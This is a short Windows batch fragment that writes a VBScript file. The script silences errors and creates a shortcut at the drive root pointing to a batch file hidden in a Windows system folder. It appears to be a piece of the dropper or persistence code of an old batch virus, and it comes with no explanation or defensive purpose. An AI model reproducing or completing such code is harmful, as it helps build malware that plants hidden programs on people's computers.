@echo.on error resume next>pif.vbs"
@echo.dim wshs, msc>>pif.vbs"
@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>pif.vbs"
@echo.set msc=wshs.CreateShortcut("C:\pif.lnk")>>pif.vbs"
@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\ioana\ioana.bat")>>pif.vbs"
@echo.msc.WindowStyle = 4>>pif.vbs"
@echo.msc.Save>>pif.vbs"